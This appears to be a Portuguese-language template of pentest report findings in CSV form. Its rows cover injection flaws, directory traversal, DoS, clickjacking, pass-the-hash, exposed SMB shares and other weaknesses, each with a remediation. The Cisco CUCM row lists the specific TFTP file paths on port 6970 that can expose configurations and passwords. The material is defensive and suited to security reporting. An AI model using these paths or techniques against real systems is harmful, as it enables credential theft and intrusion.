;Data Source Type;Data Source Key;Vulnerabilidade;Descrição;Outras observações técnicas;Recomendação - Título;Recomendação;Causa raíz;CAT1 - CONTROLE;CAT2 - OWASP;Severidade;Risco (Tags);Referência 1;Referência 2;;;;;;;;;;;;;;
;;;Injeção de script remoto;Foi identificado que a aplicação não está validando de forma correta as requisições submetidas ao servidor.<br/><br/>Por meio de variáveis vulneráveis, foi possível executar no servidor, scripts maliciosos, sendo os mesmos externos.;;Injeção de script remoto;Deve-se validar todo o conteúdo submetido ao servidor, de modo que o mesmo não execute scripts de origem externa.;-;;;HIGH;;;;;;;;;;;;;;;;;
;;;Injeção em Server-Side Includes;Variáveis Server-Side Includes servem para invocar um script armazenado no servidor para que o mesmo seja incorporado na página da aplicação.<br/><br/>Foi detectado que a aplicação está vulnerável a injeção de strings maliciosos nas variáveis de includes. Como impacto, é possível invocar um arquivo externo (RFI - Remote File Include) para ser utilizado de forma maliciosa e assim executar comandos no servidor ou ainda invocar algum arquivo interno do servidor (LFI - Local File Include).;;Injeção em Server-Side Includes;"Devem-se:<br/><br/><br/><br/>- Permitir apenas diretivas SSI necessárias para a página em questão e desativar todas as outras;<br/><br/>- Codificar o HTML do usuário que forneceu os dados antes de passá-lo para uma página com permissões de execução SSI;<br/><br/>- Use ""Suexec"" para que a página execute como sendo dono do arquivo ao invés do usuário do servidor web.";-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;LDAP Injection;A injeção LDAP é semelhante a SQL, porém ao invés de usar parâmetros SQL e o servidor de banco de dados, é utilizado o protocolo LDAP e seu respectivo servidor. A injeção LDAP permite coletar ou modificar informações confidenciais do servidor e em alguns casos modificar objetos da estrutura LDAP.<br/><br/><br/><br/>Foi possível modificar informações do servidor LDAP.<br/><br/><br/><br/>Parâmetro vulnerável:;;LDAP Injection;Deve-se também sanitizar/filtrar as entradas de dados feitas por usuários para não aceitar caracteres e expressões não esperadas pela aplicação. Normalmente, os caracteres que devem ser fitlrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Listagem de Diretórios;É possível listar diretórios publicados e ter acesso a conteúdos que não deveriam ser acessíveis.;;Listagem de Diretórios;"Configurar o servidor IIS e/ou Apache para não permitir listagem de diretórios.<br/><br/>Para o servidor Apache remova todas as entradas ""Indexes"" desnecessárias, das seções de ""Directory"" do arquivo apache2.conf ou httpd.conf. <br/><br/><br/><br/>Para o servidor IIS 6.0 vá até as propriedades do site no painel de gerenciamento do IIS e desabilite a opção “Directory Browsing”, como mostra a imagem no link abaixo.<br/><br/>http://juliusphua.com/wp-content/uploads/2010/05/IIS6_DirectoryBrowsing.jpg";-;;;LOW;;;;;;;;;;;;;;;;;
;;;Lógica de negócios;Os formulários da aplicação estão permitindo a inserção de caracteres sensíveis (como -/<>*&%$#). Caso não haja nenhum tipo de validação, esses caracteres podem ser utilizados para a construção de trechos de código malicioso que, poderão, enfim, ser executados pelo servidor ou pelo navegador.;;Lógica de negócios;"- A aplicação deve manter uma ordem crescente nas etapas de preenchimento do formulário;<br/><br/>- Deve ser utilizada uma máscara de entrada para evitar que letras sejam inseridas em campos onde serão utilizados apenas números;<br/><br/>- Deve ser criado um sistema de validação de dados para todos os campos, de modo a não permitir a inserção de números negativos ou caracteres especiais.<br/><br/><br/><br/>Referência:<br/><br/>http://www.owasp.org/index.php/Data_Validation";-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Loops no processamento de dados;Foi observado que a aplicação está possibilitando a negação de serviço, por meio de loops de processamento.<br/><br/><br/><br/>Esta situação ocorre por meio de submissão de repetitivos valores em variáveis vulneráveis e tal vulnerabilidade existe devido a variáveis vulneráveis e/ou erros no código fonte, que fazem com que o sistema entre em um loop infinito de processamento, preenchendo todo o buffer da memória RAM e levando o sistema ao DoS.;;Loops no processamento de dados;Deve ser usadas funções no sistema que limitem a quantidade de dados que o servidor conseguirá processar por ciclo, mantendo assim a consistência do servidor.<br/><br/>Caso necessário o código fonte deverá ser revisado a fim de corrigir erros no mesmo ou substituir o uso de funções inadequadas.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Negação de serviço por bloqueio de contas;A aplicação está configurada para bloquear contas de usuários após 3 tentativas erradas de autenticação.Com isso, um usuário mal-intencionado pode efetuar intencionalmente um ataque de força-bruta, com o objetivo de causar o bloqueio de contas de usuários.<br/><br/>Esta situação causaria a negação de serviço, pois impossibilitaria legítimos usuários de vir a ter acesso ao sistema.;;Negação de serviço por bloqueio de contas;Deve-se desabilitar o sistema de bloqueio de conta por tentativas erradas e adicionar um sistema de CAPTCHA após<br/><br/>3 tentativas de usuário ou senha errada, a fim de conter ataques de descoberta de credenciais.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Negação de Serviço por Buffer Overflows;Buffer Overflow ocorre quando uma aplicação tenta interpretar mais informação do que suporta, causando o transbordamento no local onde a mesma estava alocada na memória RAM. Ocorrendo o estouro do buffer da memória, é possível a execução de códigos maliciosos ou ainda ocasionar uma negação de serviço (DoS) na aplicação.<br/><br/>Devido à falta de funções de controles para limitar o fluxo de entrada de dados, a aplicação encontra-se vulnerável.;;Negação de Serviço por Buffer Overflows;"Para evitar buffer overflow, deve-se:<br/><br/><br/><br/>- Evitar o uso de variáveis vulneráveis no código fonte;<br/><br/>- Revisar o código fonte a fim de corrigir erros no código;<br/><br/>- Utilizar variáveis de controle que tenham a capacidade de limitar a quantidade máxima de bytes que a aplicação poderá alocar na memória;<br/><br/>- Manter o sistema e módulos dos servidores sempre atualizados;<br/><br/>- Pode ser utilizada alguma solução para a prevenção de estouro de buffer. Programas como (StackGuard, StackShield, ProPolice, Comodo Memory Firewall, Libsafe/ Libverify, Microsoft Visual Studio / GS flag, etc.).";-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Ordem de processamento desordenada;Foi observado que na situação onde a aplicação teve que processar duas requisições diferentes, mas da mesma página e simultaneamente, a mesma não conseguiu realizar uma diferenciação entre as requisições, com efeito o servidor emitiu uma resposta idêntica para ambas as requisições.<br/><br/><br/><br/>Na presente situação, foi possível realizar a aquisição de um produto com um valor abaixo do original.;;Ordem de processamento desordenada;Por meio de um identificador único o servidor deverá analisar cada requisição como sendo única, de modo a processar e emitir a resposta adequada para seu devido requisitante.;-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
;;;Páginas administrativas disponíveis para internet;Interfaces administrativas podem estar presentes na aplicação ou no servidor de aplicativos para permitir que usuários realizem atividades privilegiadas no site. Essa funcionalidade pode ser acessada por um usuário não autorizado ou fora do padrão.;;Páginas administrativas disponíveis para internet;Verificar a possibilidade de liberação destas interfaces apenas para hosts especificos;-;;;LOW;;;;;;;;;;;;;;;;;
;;;Páginas e aplicações padrão;Foram identificadas páginas padrão da aplicação disponível publicamente.<br/><br/><br/><br/>Páginas ou aplicações padrão podem revelar informações sobre as configurações do servidor em questão, tal como também informações sigilosas sobre a aplicação e seu funcionamento. Esta ocorrência ajuda no levantamento de informações e busca por vulnerabilidades para que terceiros mal-intencionados possam estruturar um ataque com maior eficiência.;;Páginas e aplicações padrão;Deve-se remover todo conteúdo que não seja relacionado com a aplicação, tal como páginas padrão e todo conteúdo publicado que não seja estritamente necessário para o correto funcionamento do servidor e aplicação.;-;;;LOW;;;;;;;;;;;;;;;;;
;;;Redirecionamento de URL;"Foi observado que a aplicação não está validando adequadamente a URL ao qual a requisição é realizada e posteriormente submetida, de modo, que é possível por meio de uma injeção maliciosa, redirecionar um usuário (vítima) para um site malicioso.<br/><br/>Esta situação, permite um usuário mal-intencionado à realizar um phishing attack; por exemplo, clonar o site verdadeiro e utilizar um site fake, redirecionando a vítima para o mesmo, a fim de capturar a credencial da mesma, ou mesmo infectar inúmeros computadores, para utilizá-los como bots.";;Redirecionamento de URL;Deve-se validar todas as entradas de dados nas requisições, a fim de que a aplicação não aceite caracteres não esperados, e não permita a submissão/redirecionamento de informações e usuários para domínios não autorizados.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Replay em Web Services;Não foi encontrado nenhum sistema que valide a origem e o conteúdo das requisições submetidas do cliente para a Web Services.<br/><br/>Com efeito, foi possível interceptar um arquivo XML submetido por um cliente, e reenviá-lo com conteúdo malicioso. Tal ação foi realizada em nome do cliente de origem.;;Replay em Web Services;"- Deve-se fazer uso da versão mais atual do protocolo SSL/TLS, como canal de comunicação seguro;<br/><br/>- Deve-se adotar o sistema de mutua autenticação, entre o cliente e servidor de destino.";-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Retrocessão de diretórios;A retrocessão de diretório (Directory Traversal) permite que usuários não autorizados acessem diretórios restritos dentro do sistema.;;Retrocessão de diretórios;"Deve-se manter desativado o Directory Traversal no servidor Web.<br/><br/><br/><br/>Para servidores IIS:<br/><br/>Abra o Console de gerenciamento do IIS;<br/><br/>Clique com o botão direito na pasta Web Site;<br/><br/>Clique em Properties no menu pop-up;<br/><br/>Clique na aba Home Directory;<br/><br/>Clique no botão, Configuration;<br/><br/>Na aba Options desabilite a opção Enable Parent Paths.<br/><br/>Clique em OK.<br/><br/><br/><br/>Para servidores Apache:<br/><br/>Caso não haja específica utilidade deve ser removida a opção FollowSymlinks das seções de Directory do apache2.conf, httpd.conf e demais arquivos em /etc/apache2/sites-enabled/";-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Reuso de CAPTCHA;Foi possível reutilizar um captcha anteriormente utilizado em outra sessão.<br/><br/>Com efeito, um usuário mal-intencionado poderia programar um ataque em massa utilizando sempre o mesmo captcha, já que o mesmo é sempre aceito pelo servidor.;;Reuso de CAPTCHA;Deve ser implementado um sistema de validação de captchas, de modo a ser verificado se o captcha submetido já foi utilizado. Caso o captcha já tenha sido utilizado o sistema deverá negar a requisição.<br/><br/>Recomenda-se que o captcha seja removido de sua base de dados, após sua utilização.;-;;;LOW;;;;;;;;;;;;;;;;;
;;;XML Injection;Por meio de meta-caráter foi possível injetar strings maliciosas no arquivo XML que faz chamada ao banco de dados, de modo a armazenar dados maliciosos no DB.;;XML Injection;Deve-se também sanitizar/filtrar as entradas de dados feitas por usuários para não aceitar caracteres e expressões não esperadas pela aplicação. Normalmente, os caracteres que devem ser fitlrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.;-;;;HIGH;;;;;;;;;;;;;;;;;
;;;XPath Injection;XPath é uma linguagem de programação que permite construir expressões que recorrem e processam um documento XML.<br/><br/><br/><br/>Injetando dados maliciosos na query de autenticação do arquivo XML, foi possível autenticar na aplicação, sem ter conhecimento de alguma credencial.;;XPath Injection;Deve-se também sanitizar/filtrar as entradas de dados feitas por usuários para não aceitar caracteres e expressões não esperadas pela aplicação. Normalmente, os caracteres que devem ser fitlrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.;-;;;HIGH;;;;;;;;;;;;;;;;;
V;;;Aplicação suscetível a ataques de força bruta;"A funcionalidade de autenticação deve sempre conter um CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) ou reCAPTCHA para dificultar a execução de ataques de força bruta no formulário. Assim como é recomendável estabelecer um limite de tentativas erradas de login para um único usuário, bloqueando-o temporariamente.A mensagem de erro para usuário incorreto deve ser igual à mensagem de erro para um usuário correto e senha incorreta, por exemplo “Usuário e/ou senha incorreto, por favor verifique novamente”.A validação do processo de autenticação deve ocorrer no lado do servidor, nunca do lado do cliente, além disso, deve ser utilizado serviços de autenticação padronizados e centralizados.";-;Aplicação suscetível a ataques de força bruta;"A funcionalidade de autenticação deve sempre conter um CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) ou reCAPTCHA para dificultar a execução de ataques de força bruta no formulário. Assim como é recomendável estabelecer um limite de tentativas erradas de login para um único usuário, bloqueando-o temporariamente.A mensagem de erro para usuário incorreto deve ser igual à mensagem de erro para um usuário correto e senha incorreta, por exemplo “Usuário e/ou senha incorreto, por favor verifique novamente”.A validação do processo de autenticação deve ocorrer no lado do servidor, nunca do lado do cliente, além disso, deve ser utilizado serviços de autenticação padronizados e centralizados.";Gerenciamento de Acessos;Mecanismo contra Força Bruta;;MEDIUM;;https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks;;;;;;;;;;;;;;;
V;;;Função logout inadequada;"Quando o usuário clicar no botão sair ou o tempo de expiração do cookie de sessão exceder, a sessão do usuário deve ser finalizada integralmente, tanto no client-side quanto no server-side, ou seja, não se deve apenas retirar o cookie do navegador do usuário, mas sim invalidá-lo no servidor. Assim como o sessionID devem ser únicos, gerados de forma randômicas. É essencial que todas as páginas autenticadas da aplicação tenham disponível ao usuário um botão de logout, facilitando o encerramento de sessão partindo do cliente.Além disso, é recomendável haver uma funcionalidade que o usuário consiga visualizar suas sessões ativas.";-;Função logout inadequada;"Quando o usuário clicar no botão sair ou o tempo de expiração do cookie de sessão exceder, a sessão do usuário deve ser finalizada integralmente, tanto no client-side quanto no server-side, ou seja, não se deve apenas retirar o cookie do navegador do usuário, mas sim invalidá-lo no servidor. Assim como o sessionID devem ser únicos, gerados de forma randômicas. É essencial que todas as páginas autenticadas da aplicação tenham disponível ao usuário um botão de logout, facilitando o encerramento de sessão partindo do cliente.Além disso, é recomendável haver uma funcionalidade que o usuário consiga visualizar suas sessões ativas.";Gerenciamento de Acessos;Mecanismo de logout;;MEDIUM;;;;;;;;;;;;;;;;;
V;;;Acessos indevidos a arquivos e informações;Em sistemas com privilégios de acessos diferentes dos usuários é possível que as limitações de acesso não sejam feitas corretamente, essa falha pode permitir que um usuário seja capaz de acessar funcionalidades ou recursos que não possui autorização.;-;;"É importante negar todos os acessos caso a aplicação não consiga acessar as informações contidas na configuração de segurança mínima definida na aplicação e no servidor web.Os seguintes acessos devem ser disponibilizados somente aos usuários autorizados:_ Arquivos e outros recursos, incluindo aqueles que estão fora do controle direto da aplicação;_ URLs protegidas;_ Funções protegidas;_ Referências diretas aos objetos (não incrementais).Caso os dados precisem ser armazenados obrigatoriamente no lado do cliente, deve-se utilizar mecanismos de criptografia e verificação de integridade (HASH) no lado do servidor para detectar possíveis adulterações e garantir que os fluxos lógicos da aplicação obedeçam às regras do negócio.Se for permitida a existência de sessões autenticadas por longos períodos de tempo, deve-se fazer a revalidação periódica da autorização do usuário para garantir que os privilégios não foram modificados e, caso tenham sido, realizar o registro em log do usuário e exigir uma nova autenticação. ";Gerenciamento de Acessos;Privilégios de acesso (Segregação de acesso);;;;https://www.owasp.org/index.php/Testing_for_Privilege_escalation_(OTG-AUTHZ-003);;;;;;;;;;;;;;;
V;;;Proteção de informações sensíveis;É necessário garantir que não seja possível visualizar dados sensíveis ou desnecessários ao contexto do usuário;-;Proteção de informações sensíveis;"É necessário garantir que não seja possível visualizar dados sensíveis ou desnecessários ao contexto do usuário, sendo alguns exemplos de arquivos:- Códigos fontes em arquivos temporários: muitos editores de texto mantêm cópias temporárias (ou de backup) quando estão manipulando arquivos de texto, essas cópias geralmente não possuem extensões conhecidas pelo servidor e são mostradas em forma de texto ao usuário.- Arquivos de log: geralmente utilizados para depuração do funcionamento da aplicação, alguns desses arquivos podem conter informações sensíveis.- Listagem de diretórios: além de mostrar a estrutura de diretórios da aplicação, podem revelar arquivos com as características dos itens anteriores.- Código HTML: evitar utilizar dados sensíveis no código, nos campos HIDDEN ou em comentários detalhados, por exemplo. Muitos dos exemplos citados podem estar presentes em ambiente de desenvolvimento, ao migrar o ambiente para um ambiente produtivo, é necessário verificar se não há esse tipo de exposição, como, por exemplo, arquivos TMP, BKP, OLD, entre outros.No ambiente produtivo é necessário estar disponível somente os arquivos essenciais para o funcionamento da aplicação..";Gerenciamento de Acessos;Proteção de informações sensíveis ;;;;;;;;;;;;;;;;;;;
v;;;Comunicação insegura entre cliente e servidor (HTTP);Deve-se sempre utilizar um canal seguro para a comunicação de dados entre cliente e servidor.;-;Comunicação insegura entre cliente e servidor (HTTP);"Deve-se sempre utilizar um canal seguro para a comunicação de dados entre cliente e servidor.A utilização do HTTPS com um protocolo de segurança seguro (TLSv1.2), com a flag HSTS (HTTP Strict Transport Security) é estritamente necessário para o tráfego de dados considerados confidenciais.É recomendável forçar a conexão diretamente pela porta 443, evitando redirecionamentos da porta 80 (HTTP) para a porta 443, isso dificulta a criação de um cenário que possibilita ataques de Man-In-The-Middle, situação em que um usuário mal-intencionado se posiciona entre o cliente e servidor para capturar a informação trafegada. ";Comunicação Segura;Utilização de canal de comunicação segura;;CRITICAL;;;;;;;;;;;;;;;;;
v;;;Dados sensíveis trafegando via método POST;"O método POST deve ser utilizado sempre que haja a necessidade de tráfego de dados sensíveis, como por exemplo, senhas de usuários, tokens de sessão e dados do usuário.Na URL (método GET) devem ser trafegados somente dados não críticos que podem ser expostos.";-;Dados sensíveis trafegando via método POST;"O método POST deve ser utilizado sempre que haja a necessidade de tráfego de dados sensíveis, como por exemplo, senhas de usuários, tokens de sessão e dados do usuário.Na URL (método GET) devem ser trafegados somente dados não críticos que podem ser expostos.";Comunicação Segura;Utilização do método POST;;CRITICAL;;;;;;;;;;;;;;;;;
V;;;Arquivos inapropriados armazenados por usuários;Arquivos impróprios/indevidos foram identificados durante a análise, o download desses arquivos muitas vezes inflige leis de direitos autorais, podendo acarretar em multas e processos judiciais para a empresa, ou conter códigos maliciosos que podem ser executados em segundo plano e impactar a Organização diretamente.;-;Arquivos inapropriados armazenados por usuários;"Deve-se implementar os seguintes controles:•        Regra de boqueio do uso de programas P2P;•        Filtros de conteúdo, restringindo o acesso a conteúdo indevido;•        Política de Segurança da Informação, onde defina as práticas de segurança corporativas, onde proíba a coleta, execução e armazenamento de conteúdos indevidos na Organização;•        Programa de conscientização, onde forneça palestras, pílulas de segurança, entre outras práticas, para conscientizar os usuários do uso correto dos recursos corporativos e evitar a exposição a riscos atrelados ao mal comportamento digital dos colaboradores.";Conscientização;;;;;;;;;;;;;;;;;;;;
V;;;A aplicação apresenta inconsistência.;Inconsistências na execução da aplicação podem gerar comportamentos inesperados, causando problemas como vazamento de informações ou serviço indisponível, por exemplo.;-;A aplicação apresenta inconsistência.;Deve-se investigar a causa da ocorrência em questão, a fim de evitar o mesmo comportamento em ambiente de produção.;Desenvolvimento Seguro;;;INFORMATIVE;;;;;;;;;;;;;;;;;
V;;;A aplicação contém campo password com atributo autocomplete habilitado;O servidor web está disponibilizando um formulário HTML contendo uma entrada do tipo “password” cujo o parâmetro 'autocomplete' não está configurado com a opção 'off'. Dessa forma as credenciais de acesso ficam armazenadas no navegador permitindo a um atacante poderá obter informações sensíveis.;-;A aplicação contém campo password com atributo autocomplete habilitado;Adicionar o atributo 'autocomplete=off' nos campos do tipo “Password” no formulário da aplicação web, para prevenir que o navegador armazene dados sensíveis.;Desenvolvimento Seguro;;;;;;;;;;;;;;;;;;;;
V;;;A aplicação permite falsificação de e-mail;"A aplicação permite falsificação de e-mail, onde é possível enviar e-mails em nome da Organização sem autorização, utilizando o próprio serviço de e-mail corporativo.Através do javascript implementado na aplicação, é possível alterar o endereço de destino do e-mail inserido na aplicação, do lado do cliente.Usuários mal-intencionados podem realizar ataques de engenharia social/phishing através desta vulnerabilidade para enviar e-mails falsos em nome da Organização.";-;A aplicação permite falsificação de e-mail;Definir os parâmetros de envio de e-mail do lado do servidor. O destinatário deve estar em uma configuração interna da aplicação e não no script executado no cliente (Browser).;Desenvolvimento Seguro;;OWASP - A6 – Security Misconfiguration;Crítico;;;;;;;;;;;;;;;;;
;;Comunicação insegura entre cliente e servidor (HTTP);A aplicação não utiliza um protocolo seguro para autenticação do usuário;EXCLUIR;EXCLUIR;EXCLUIR;EXCLUIR;-;;;;;;;;;;;;;;;;;;;;
V;;;Informações Sensíveis Submetidas na URL;Informações sensíveis estão sendo submetidas na URL, permitindo a descoberta de informações críticas, assim como o mesmo é armazenado em logs, ferindo o princípio de confidencialidade.;-;Informações Sensíveis Submetidas na URL;"Deve-se implementar os seguintes controles:- Utilizar o método POST sempre que informações sensíveis forem enviadas do cliente para o servidor e vice-versa;- Utilizar certificado digital válido nessa comunicação (HTTPS) com a flag HSTS.";Desenvolvimento Seguro;;;LOW;;;;;;;;;;;;;;;;;
V;;;Mensagem de erro inadequada;"Um aspecto importante do desenvolvimento seguro de aplicações é evitar o vazamento de informações. Na tentativa da aplicação processar uma requisição não esperada, a mesma apresentou uma tela com a depuração da exceção ocorrida, devido à falha no processo.Com efeito, as informações exibidas ajudam o usuário mal-intencionado a identificar detalhes da aplicação, trechos de código, bibliotecas utilizadas, entre outras falhas na aplicação. Estas informações são úteis para a elaboração de um ataque mais elaborado a organização.Um caso que mensagens de erro são importantes para ataques é a exposição de mensagens geradas pelo banco de dados para a execução de injeção de comandos SQL.Outro exemplo bastante útil ao usuário mal-intencionado é o path disclosure, situação em que a mensagem de erro exibe informações relativas ao caminho de diretórios da aplicação, baseadas no sistema de arquivos do servidor que a hospeda. Esse tipo de informação pode ser importante quando o usuário mal-intencionado visa executar ataques de path traversal ou explorar falhas em componentes de upload, podendo posicionar os arquivos de sua escolha em lugares específicos do servidor de aplicações.A inibição das mensagens de erro com informações fará com que esses ataques sejam feitos “às cegas”, uma vez que as tecnologias que suportam a aplicação não lhes forneceram informações sobre erros ou acertos de suas tentativas, dificultando a execução de um ataque rápido e bem-sucedido.";-;Mensagem de erro inadequada;"Mensagens de erro não tratadas que são excessivamente descritivas auxiliam a obtenção de informações úteis para a execução de ataques.As mensagens de erro devem ser tratadas, de maneira que não exponham:_ Nomes de classes e métodos do código;_ Paths;_ Alertas de inconsistência de “tipagem”;_ Alertas de inconsistência no número de parâmetros variáveis;_ Nomes de tabelas, colunas e informações da base de dados.Sendo assim, quaisquer mensagens que reportem erros em tempo de execução oriundos da tecnologia utilizada, seja na aplicação ou na tecnologia agregada a ela (servidor de aplicação ou banco de dados, por exemplo), não devem ser exibidas em ambientes produtivos.";Gerenciamento de Configuração;Tratamento de mensagens de erro;OWASP - A6 – Security Misconfiguration;-;;https://www.owasp.org/index.php/Error_Handling;;;;;;;;;;;;;;;
V;;;Recuperação de senha;Não foi identificado a função de recuperação de senha, uma vez que o sistema atual depende de um administrador para criar uma nova senha e informá-la ao usuário. Este procedimento não é adequado, pois é passível a erro humano e fere questões de privacidade e não-repúdio.;-;Recuperação de senha;Deve-se criar um processo automatizado de recuperação de senha, por meio de uma função “esqueci minha senha” na tela de login. Podendo ser realizado através de um campo, onde o usuário pode inserir seu e-mail cadastrado e, caso válido, enviar um link único e randômico para a troca de senha. Esse link deve ter validade única e tempo de expiração de um dia a fim de evitar mal-uso.;Desenvolvimento Seguro;;;LOW;;;;;;;;;;;;;;;;;
;;Recuperação de senha;Recuperação de senha através de perguntas/respostas;Foi observado que o atual mecanismo de recuperação de senha baseia-se em um sistema de pergunta e resposta.<br/><br/>Este atual sistema faz uso de perguntas consideradas fracas, ou seja, cuja resposta torna-se fácil se descobrir.;-;Recuperação de senha através de perguntas/respostas;- Deve-se fazer uso de 6 perguntas para o mecanismo de pergunta/resposta.<br/><br/><br/><br/>Ou <br/><br/><br/><br/>- Deve-se criar um sistema automatizado de recuperação de senha, por meio de uma função “esqueci minha senha” na tela de login.<br/><br/>Uma das formas é fornecer o campo para o usuário inserir seu email cadastrado e, caso válido, enviar um link único e randômico para a troca de senha. <br/><br/>Esse link deve ter validade única e tempo de expiração de um dia a fim de evitar mal uso.;Desenvolvimento Seguro;;;LOW;;;;;;;;;;;;;;;;;
V;;;A aplicação está vulnerável a Clickjacking;"A aplicação está vulnerável a ataques de Clickjacking permitindo a um usuário mal-intencionado criar múltiplas camadas em um botão, link ou página fazendo com que os usuários sejam redirecionados para uma página maliciosa.A aplicação pode ser executada dentro de um tag iframe de uma página maliciosa. A partir desse momento, usuários mal-intencionado podem criar uma página falsa, induzindo usuários legítimos a inserirem dados, que podem ser capturados pelo mesmo.";-;A aplicação está vulnerável a Clickjacking;Deve-se ativar o cabeçalho X-Frame-Options no servidor web;Gerenciamento de Configuração;;;INFORMATIVE;;;;;;;;;;;;;;;;;
V;;;Acesso a Informações do Telefone IP Cisco (CTFTP);"O serviço TFTP é um servidor HTTP personalizado que escuta na porta TCP 6970. Através desse serviço é possível acessar determinados arquivos, como arquivos de configuração dos telefones IP, os quais podem conter senhas de acesso para o Cisco Unified Communications Manager (CUCM). Outros arquivos no serviço HTTP podem revelar informações e configurações relacionadas a infraestrutura.Os seguintes caminhos codificados podem ser usados para divulgar informações sobre a configuração do CUCM:Lista de arquivos TFTP /ConfigFileCacheList.txt incluindo nome do arquivo de configuração do telefone (que pode conter senhas);Outros locais:/BinFileCacheList.txt/FileList.txt/PerfMon.txt/ParamList.txt/lddefault.cfg";-;Acesso a Informações do Telefone IP Cisco (CTFTP);"Como forma de recomendação para correção da vulnerabilidades, é importante que a empresa implemente:•        Segmentação da rede de voz em relação à rede de dados (VLANs);•        Para impressoras e outros dispositivos sem suporte ao protocolo 802.1x, utilizar um firewall para garantir que em caso de algum tipo de acesso, a comunicação fique restrita somente aos serviços necessário dentro daquele escopo de rede;•        Bloquear o acesso do usuário as configurações no telefone IP (Desabilitar o acesso ao Settings Access dentro do CUCM);•        Retirar a etiqueta no telefone IP, onde possui o endereço MAC, pois caso essa informação seja coletada, é possível realizar o bypass do protocolo 802.1x;•        Em caso do dispositivo oferecer suporte, configurar os mesmos para que utilizem o protocolo 802.1x para acesso seguro à rede;•        Monitorar tráfego na VLAN de voz, para identificar ações maliciosas";Gerenciamento de Configuração;;;;;;;;;;;;;;;;;;;;
V;;;Aplicação Bind - Negação de Serviço por Buffer Overflow;"O transbordamento de dados, conhecido como Buffer Overflow ocorre quando uma aplicação tenta interpretar mais informações do que suporta, causando o transbordamento no local onde a mesma estava alocada na memória RAM. Ocorrendo o estouro do buffer da memória é possível a execução de códigos maliciosos ou ainda ocasionar uma negação de serviço (DoS) na aplicação.Devido à falta de funções de controles para limitar o fluxo de entrada de dados, a aplicação encontra-se vulnerável. A exploração dessa vulnerabilidade tornaria o serviço indisponível a toda operação da empresa que dependa desse serviço.";-;Aplicação Bind - Negação de Serviço por Buffer Overflow;Para aplicar a atualização de segurança no programa vulnerável (Bind) siga a instrução em: https://access.redhat.com/articles/11258#rhel6;Gerenciamento de Configuração;;;CRITICAL;;https://my.simplercloud.com/index.php?/news/view/47/critical-alert--bind-tkey-vulnerability-affecting-linux-systems-running-bind-dns-server---cve-2015-5477/;https://access.redhat.com/articles/11258#rhel6;;;;;;;;;;;;;;
V;;;Bypass no Mecanismo de Autenticação;"Foi possível burlar o mecanismo de autenticação, ou seja, é possível acessar o sistema mesmo sem ter conhecimento de um usuário e senha válido.Neste caso o bypass foi realizado por meio da técnica PTH (Pass-The-Hash) onde o usuário mal-intencionado faz uso de um hash coletado em um sistema e o utiliza para comprometer em outro, sem a necessidade de identificar a senha correspondente ao hash.";-;Bypass no Mecanismo de Autenticação;"Deve-se implementar as seguintes recomendações:•        Isolar sistema sensível: Defina uma conta apenas para a execução deste serviço.•        Reduzir o privilégio de acesso dos usuários;•        Evite o uso de LM e NTLM challenge response;•        Limite credenciais em cache•        Monitore o servidor";Gerenciamento de Configuração;;;;;https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283;https://www.csoonline.com/article/2622729/stop-pass-the-hash-attacks-before-they-begin.html;;;;;;;;;;;;;;
V;;;Compartilhamento indevido de arquivos via Microsoft Windows SMB;O serviço de compartilhamento Windows está disponibilizando informações sensíveis para usuários não autorizados.;-;Compartilhamento indevido de arquivos via Microsoft Windows SMB;Restrinja o acesso aos diretórios apenas as pessoas que devem ter acesso ao mesmo. Para restringir o acesso, no Windows abra o Explorer, clique com o botão direito em cada pasta compartilhada, acesse a aba 'compartilhamento' e clique em 'permissões'.;Gerenciamento de Configuração;;;;;;;;;;;;;;;;;;;;
